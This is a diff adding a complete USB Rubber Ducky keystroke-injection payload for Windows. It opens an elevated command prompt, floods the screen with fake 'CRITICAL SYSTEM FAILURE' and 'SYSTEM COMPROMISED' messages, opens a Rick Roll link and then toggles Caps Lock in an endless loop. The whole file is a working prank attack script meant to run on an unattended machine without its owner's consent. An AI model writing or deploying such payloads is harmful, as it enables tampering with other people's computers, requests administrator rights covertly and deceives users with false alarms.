@@ -1,0 +1,33 @@
+DELAY 2000
+GUI r
+DELAY 500
+STRING powershell Start-Process cmd -Verb RunAs
+ENTER
+DELAY 2000
+
+REM Spam fake error popups
+REPEAT 10
+    STRING msg * "CRITICAL SYSTEM FAILURE: USB DEVICE CORRUPTED"
+    ENTER
+    DELAY 500
+REPEAT END
+
+REM Open Rick Roll in browser
+STRING start https://www.youtube.com/watch?v=dQw4w9WgXcQ
+ENTER
+DELAY 1000
+
+REM Spam keyboard input (gibberish)
+REPEAT 100
+    STRING ERROR! ERROR! SYSTEM COMPROMISED!
+    ENTER
+    DELAY 100
+REPEAT END
+
+REM Infinite CAPS LOCK toggle (annoying AF)
+REPEAT
+    CAPSLOCK
+    DELAY 100
+    CAPSLOCK
+    DELAY 100
+REPEAT END
